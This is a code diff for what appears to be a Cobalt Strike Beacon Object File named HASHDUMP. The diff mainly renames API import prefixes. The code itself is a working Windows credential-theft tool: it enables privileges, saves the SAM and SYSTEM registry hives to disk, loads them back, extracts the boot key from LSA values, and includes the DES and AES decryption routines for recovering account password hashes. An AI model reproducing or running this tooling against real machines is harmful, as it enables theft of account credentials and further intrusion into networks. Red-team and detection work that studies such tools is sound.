@@ -2,8 +2,7 @@
 #include <windows.h>
 #include "bofdefs.h"
 #include "hive_parser.c"
-#include "../_include/bofdefs.h"
-#include "../_include/beacon.h"
+#include "beacon.h"
 
 const BYTE ODD_PARITY[] = {
     1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
@@ -30,29 +29,29 @@ BOOL DecryptDES(const BYTE *key, const BYTE *data, BYTE *output)
     BCRYPT_KEY_HANDLE hKey = NULL;
     BOOL result = FALSE;
 
-    NTSTATUS status = bcrypt$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_DES_ALGORITHM, NULL, 0);
+    NTSTATUS status = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_DES_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status))
         return FALSE;
 
-    status = bcrypt$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
+    status = BCRYPT$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
     if (!BCRYPT_SUCCESS(status)) {
-        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
+        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
-    status = bcrypt$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 8, 0);
+    status = BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 8, 0);
     if (!BCRYPT_SUCCESS(status)) {
-        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
+        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
     DWORD cbResult = 0;
-    status = bcrypt$BCryptDecrypt(hKey, (PUCHAR)data, 8, NULL, NULL, 0, output, 8, &cbResult, 0);
+    status = BCRYPT$BCryptDecrypt(hKey, (PUCHAR)data, 8, NULL, NULL, 0, output, 8, &cbResult, 0);
 
     result = BCRYPT_SUCCESS(status);
 
-    bcrypt$BCryptDestroyKey(hKey);
-    bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
+    BCRYPT$BCryptDestroyKey(hKey);
+    BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
     return result;
 }
 
@@ -65,25 +64,25 @@ BOOL DecryptAES_CBC( const BYTE *key, DWORD keyLen,const BYTE *iv,DWORD ivLen, c
     BOOL result = FALSE;
 
     // Open AES algorithm provider
-    NTSTATUS status = bcrypt$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+    NTSTATUS status = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open AES algorithm provider\n");
         return FALSE;
     }
 
     // Set chaining mode to CBC
-    status = bcrypt$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    status = BCRYPT$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
     if (!BCRYPT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to set chaining mode\n");
-        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
+        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
     // Generate symmetric key
-    status = bcrypt$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, keyLen, 0);
+    status = BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, keyLen, 0);
     if (!BCRYPT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to generate symmetric key\n");
-        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
+        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
@@ -91,26 +90,26 @@ BOOL DecryptAES_CBC( const BYTE *key, DWORD keyLen,const BYTE *iv,DWORD ivLen, c
     *decryptedOut = (BYTE *)AllocateMemory(encryptedLen);
     if (!*decryptedOut) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to allocate memory for decrypted data\n");
-        bcrypt$BCryptDestroyKey(hKey);
-        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
+        BCRYPT$BCryptDestroyKey(hKey);
+        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
     // Decrypt
     DWORD decryptedSize = 0;
-    status = bcrypt$BCryptDecrypt(hKey, (PUCHAR)encrypted, encryptedLen, NULL, (PUCHAR)iv, ivLen, *decryptedOut, encryptedLen, &decryptedSize, 0);
+    status = BCRYPT$BCryptDecrypt(hKey, (PUCHAR)encrypted, encryptedLen, NULL, (PUCHAR)iv, ivLen, *decryptedOut, encryptedLen, &decryptedSize, 0);
     if (!BCRYPT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Decryption failed\n");
         FreeMemory(*decryptedOut);
         *decryptedOut = NULL;
-        bcrypt$BCryptDestroyKey(hKey);
-        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
+        BCRYPT$BCryptDestroyKey(hKey);
+        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
     *decryptedOutLen = decryptedSize;
-    bcrypt$BCryptDestroyKey(hKey);
-    bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
+    BCRYPT$BCryptDestroyKey(hKey);
+    BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
     return TRUE;
 }
 
@@ -121,11 +120,11 @@ BOOL EnablePrivilege(LPCWSTR privilege)
     LUID luid;
     TOKEN_PRIVILEGES tkp;
 
-    if (!Advapi32$OpenProcessToken(Kernel32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
         return FALSE;
 
-    if (!Advapi32$LookupPrivilegeValueA(NULL, privilege, &luid)) {
-        Kernel32$CloseHandle(hToken);
+    if (!ADVAPI32$LookupPrivilegeValueA(NULL, privilege, &luid)) {
+        KERNEL32$CloseHandle(hToken);
         return FALSE;
     }
 
@@ -133,12 +132,12 @@ BOOL EnablePrivilege(LPCWSTR privilege)
     tkp.Privileges[0].Luid = luid;
     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    if (!Advapi32$AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
-        Kernel32$CloseHandle(hToken);
+    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
+        KERNEL32$CloseHandle(hToken);
         return FALSE;
     }
 
-    Kernel32$CloseHandle(hToken);
+    KERNEL32$CloseHandle(hToken);
     return TRUE;
 }
 
@@ -149,10 +148,10 @@ DWORD GetCurrentControlSet(HKEY hSystem)
     DWORD controlSet = 1;
     DWORD type, value, size = sizeof(DWORD);
 
-    if (Advapi32$RegOpenKeyExA(hSystem, "Select", 0, KEY_READ, &hSelect) == ERROR_SUCCESS) {
-        if (Advapi32$RegQueryValueExA(hSelect, "Current", NULL, &type, (LPBYTE)&value, &size) == ERROR_SUCCESS)
+    if (ADVAPI32$RegOpenKeyExA(hSystem, "Select", 0, KEY_READ, &hSelect) == ERROR_SUCCESS) {
+        if (ADVAPI32$RegQueryValueExA(hSelect, "Current", NULL, &type, (LPBYTE)&value, &size) == ERROR_SUCCESS)
             controlSet = value;
-        Advapi32$RegCloseKey(hSelect);
+        ADVAPI32$RegCloseKey(hSelect);
     }
     return controlSet;
 }
@@ -165,7 +164,7 @@ BOOL GetBootKey(HKEY hSystem, LPCSTR lsaPath, BYTE *bootKey)
     DWORD size = sizeof(data);
     LONG res;
 
-    if (Advapi32$RegOpenKeyExA(hSystem, lsaPath, 0, KEY_READ, &hLsa) != ERROR_SUCCESS) {
+    if (ADVAPI32$RegOpenKeyExA(hSystem, lsaPath, 0, KEY_READ, &hLsa) != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open key");
         return FALSE;
     }
@@ -182,16 +181,16 @@ BOOL GetBootKey(HKEY hSystem, LPCSTR lsaPath, BYTE *bootKey)
         wchar_t classValue[256];
         DWORD classValueSize = sizeof(classValue) / 2;
 
-        res = Advapi32$RegOpenKeyW(hLsa, values[i], &hKey);
+        res = ADVAPI32$RegOpenKeyW(hLsa, values[i], &hKey);
         if (res != ERROR_SUCCESS) {
             BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open key");
             return FALSE;
         }
-        if (Advapi32$RegQueryInfoKeyW(hKey, classValue, &classValueSize, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
+        if (ADVAPI32$RegQueryInfoKeyW(hKey, classValue, &classValueSize, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
             BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to read class");
             return FALSE;
         }
-        Advapi32$RegCloseKey(hKey);
+        ADVAPI32$RegCloseKey(hKey);
 
         // Decode the bootkey hex strings
         for (size_t j = 0; j < classValueSize / 2; ++j) {
@@ -203,7 +202,7 @@ BOOL GetBootKey(HKEY hSystem, LPCSTR lsaPath, BYTE *bootKey)
     for (DWORD i = 0; i < 16; i++)
         bootKey[i] = bootKeyParts[indices[i]];
 
-    Advapi32$RegCloseKey(hLsa);
+    ADVAPI32$RegCloseKey(hLsa);
     return TRUE;
 }
 
@@ -228,7 +227,7 @@ void InitializeBackupPaths()
 
     char basePath[MAX_PATH];
     // Get AppData\Local path
-    DWORD envLen = Kernel32$GetEnvironmentVariableA("LOCALAPPDATA", basePath, MAX_PATH);
+    DWORD envLen = KERNEL32$GetEnvironmentVariableA("LOCALAPPDATA", basePath, MAX_PATH);
     if (envLen == 0 || envLen >= MAX_PATH)
         MSVCRT$strcpy_s(basePath, MAX_PATH, "C:\\temp"); // Fallback
 
@@ -270,28 +269,28 @@ void go()
     // Backup hives
     HKEY hSystem;
     HKEY hSam;
-    res = Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM", 0, KEY_READ, &hSystem);
+    res = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM", 0, KEY_READ, &hSystem);
     if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegOpenKeyExA failed: %d\n", res);
         return;
     }
 
-    res = Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ, &hSam);
+    res = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ, &hSam);
     if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegOpenKeyExA failed: %d\n", res);
         return;
     }
 
     // Save the hives to a files
-    res = Advapi32$RegSaveKeyA(hSystem, systemBackupPath, NULL);
-    Advapi32$RegCloseKey(hSystem);
+    res = ADVAPI32$RegSaveKeyA(hSystem, systemBackupPath, NULL);
+    ADVAPI32$RegCloseKey(hSystem);
     if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyW failed: %d\n", res);
         return;
     }
 
-    res = Advapi32$RegSaveKeyA(hSam, samBackupPath, NULL);
-    Advapi32$RegCloseKey(hSam);
+    res = ADVAPI32$RegSaveKeyA(hSam, samBackupPath, NULL);
+    ADVAPI32$RegCloseKey(hSam);
     if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyW failed: %d\n", res);
         return;
@@ -300,7 +299,7 @@ void go()
     BeaconPrintf(CALLBACK_OUTPUT, "[HASHDUMP] Dumped SAM and SYSTEM");
 
     // Load backuped SYSTEM key
-    res = Advapi32$RegLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey, systemBackupPath);
+    res = ADVAPI32$RegLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey, systemBackupPath);
     if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegLoadKeyA failed: %d\n", res);
         return;
@@ -308,7 +307,7 @@ void go()
 
     // Get current control set
     HKEY hSystemBak;
-    res = Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "BACKUP1", 0, KEY_READ, &hSystemBak);
+    res = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "BACKUP1", 0, KEY_READ, &hSystemBak);
     if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open SYSTEM backup key: %d\n", res);
         return;
@@ -323,10 +322,10 @@ void go()
     BYTE bootKey[16];
     if (!GetBootKey(hSystemBak, lsaPath, bootKey)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to extract boot key");
-        Advapi32$RegCloseKey(hSystemBak);
+        ADVAPI32$RegCloseKey(hSystemBak);
         return;
     }
-    Advapi32$RegCloseKey(hSystemBak);
+    ADVAPI32$RegCloseKey(hSystemBak);
 
     BeaconPrintf(CALLBACK_OUTPUT, "[HASHDUMP] Bootkey: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                  bootKey[0], bootKey[1], bootKey[2], bootKey[3],
@@ -334,7 +333,7 @@ void go()
                  bootKey[8], bootKey[9], bootKey[10], bootKey[11],
                  bootKey[12], bootKey[13], bootKey[14], bootKey[15]);
 
-    res = Advapi32$RegUnLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey);
+    res = ADVAPI32$RegUnLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey);
     if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to unload SYSTEM backup key: %d\n", res);
         return;
